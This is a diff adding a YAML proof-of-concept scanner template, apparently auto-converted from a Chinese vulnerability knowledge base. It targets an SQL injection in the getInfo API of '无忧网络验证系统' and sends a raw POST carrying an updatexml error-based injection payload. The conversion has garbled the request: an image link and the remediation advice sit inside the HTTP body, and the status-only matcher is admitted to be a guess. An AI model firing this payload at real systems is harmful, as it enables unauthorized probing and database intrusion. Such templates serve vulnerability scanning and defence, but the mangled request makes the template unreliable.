@@ -1,0 +1,56 @@
+id: poc-huayqgzanz9ocbwp
+info:
+  name: 无忧网络验证系统 getInfo SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/huayqgzanz9ocbwp
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: huayqgzanz9ocbwp
+http:
+- raw:
+  - 'POST /index.php/api/Software/getInfo HTTP/1.1
+
+
+    Host: {{Hostname}}
+
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    data=1&id=1 and updatexml(1,concat(0x7e,md5(12345),0x7e),1)
+
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717058228309-50dbc66d-1204-426f-9723-d64ddd46a317.png)
+
+
+    ## 修复建议
+
+    <font style="color:#333333;">1、请联系厂商进行修复或升级到安全版本。
+
+    </font><font style="color:#333333;">2、如非必要，禁止公网访问该系统。
+
+    </font><font style="color:#333333;">3、设置白名单访问。</font>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
